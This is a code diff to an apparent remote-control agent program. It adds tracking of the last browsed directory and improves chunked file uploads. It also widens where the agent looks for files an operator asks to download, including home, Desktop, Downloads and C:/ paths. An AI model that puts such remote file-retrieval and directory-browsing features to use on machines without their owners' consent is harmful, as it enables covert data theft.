@@ -711,6 +711,9 @@ controller_thread = None
 connected_agents = {}
 agents_data = {}
 operators = set()
+
+# File manager state
+LAST_BROWSED_DIRECTORY = None  # Track the last directory browsed in UI file manager
 background_initializer = None
 high_performance_capture = None
 low_latency_input = None
@@ -7209,15 +7212,24 @@ def on_file_chunk_from_operator(data):
         
         # Check if file is complete
         received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
-        log_message(f"File {filename}: received {received_size}/{total_size} bytes")
         
-        # If we have received all chunks or this is the last chunk (total_size might be 0)
+        # Update total_size if it was 0 but we're receiving multiple chunks
+        if total_size == 0 and buffers[destination_path]['total_size'] > 0:
+            total_size = buffers[destination_path]['total_size']
+        elif total_size > 0:
+            buffers[destination_path]['total_size'] = total_size
+        
+        # Calculate progress
+        if total_size > 0:
+            progress = int((received_size / total_size) * 100)
+            log_message(f"File {filename}: received {received_size}/{total_size} bytes ({progress}%)")
+        else:
+            log_message(f"File {filename}: received {received_size} bytes (waiting for total_size or completion event)")
+        
+        # Only save when we've received all chunks (wait for completion event)
+        # Don't auto-save when total_size is 0 - wait for upload_complete event instead
         if total_size > 0 and received_size >= total_size:
             log_message(f"File complete: received {received_size}/{total_size} bytes")
-            _save_completed_file(destination_path, buffers[destination_path])
-        elif total_size == 0 and len(buffers[destination_path]['chunks']) > 0:
-            # If total_size is 0, assume this is the only chunk and save immediately
-            log_message(f"Total size is 0, saving single chunk file immediately")
             _save_completed_file(destination_path, buffers[destination_path])
             
     except Exception as e:
@@ -7270,35 +7282,60 @@ def on_request_file_chunk_from_agent(data):
         log_message("Socket.IO not available, cannot handle file chunk request", "warning")
         return
     """Handle file download request from controller - send file in chunks."""
+    global LAST_BROWSED_DIRECTORY
+    
     log_message(f"File download request received: {data}")
     filename = data.get('filename')
+    provided_path = data.get('path')  # UI might send full path
+    
     if not filename:
         log_message("Invalid file request - no filename provided")
         return
     
-    # Try to find the file in common locations or use the provided path
-    possible_paths = [
-        filename,  # Try as-is first
+    # Build search paths (prioritize last browsed directory and provided path)
+    possible_paths = []
+    
+    # 1. If UI provided full path, try it first
+    if provided_path:
+        possible_paths.append(provided_path)
+    
+    # 2. Try in last browsed directory (from file manager UI)
+    if LAST_BROWSED_DIRECTORY:
+        possible_paths.append(os.path.join(LAST_BROWSED_DIRECTORY, filename))
+        log_message(f"[FILE_MANAGER] Will check last browsed directory: {LAST_BROWSED_DIRECTORY}")
+    
+    # 3. Try as-is (might be absolute path)
+    possible_paths.append(filename)
+    
+    # 4. Try common locations
+    possible_paths.extend([
         os.path.join(os.getcwd(), filename),  # Current directory
         os.path.join(os.path.expanduser("~"), filename),  # Home directory
         os.path.join(os.path.expanduser("~/Desktop"), filename),  # Desktop
         os.path.join(os.path.expanduser("~/Downloads"), filename),  # Downloads
         os.path.join("C:/", filename),  # C: root
         os.path.join("C:/Users/Public", filename),  # Public folder
-    ]
+    ])
     
     file_path = None
     for path in possible_paths:
         if os.path.exists(path):
             file_path = path
-            log_message(f"Found file at: {file_path}")
+            log_message(f"✅ Found file at: {file_path}")
             break
     
     if not file_path:
-        log_message(f"File not found: {filename}")
+        log_message(f"❌ File not found: {filename}")
         log_message("Searched in:")
         for path in possible_paths:
             log_message(f"  - {path}")
+        
+        # Send error back to UI
+        sio.emit('file_chunk_from_agent', {
+            'agent_id': get_or_create_agent_id(),
+            'filename': filename,
+            'error': f'File not found: {filename}. Last browsed dir: {LAST_BROWSED_DIRECTORY or "None"}'
+        })
         return
     
     try:
@@ -10315,8 +10352,14 @@ def on_command(data):
             output = f"Error listing processes: {e}"
     elif command.startswith("list-dir"):
         try:
+            global LAST_BROWSED_DIRECTORY
             parts = command.split(":",1)
             path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+            
+            # Remember this directory for file downloads
+            LAST_BROWSED_DIRECTORY = path
+            log_message(f"[FILE_MANAGER] Browsing directory: {path}")
+            
             entries = []
             if os.path.isdir(path):
                 for name in os.listdir(path):
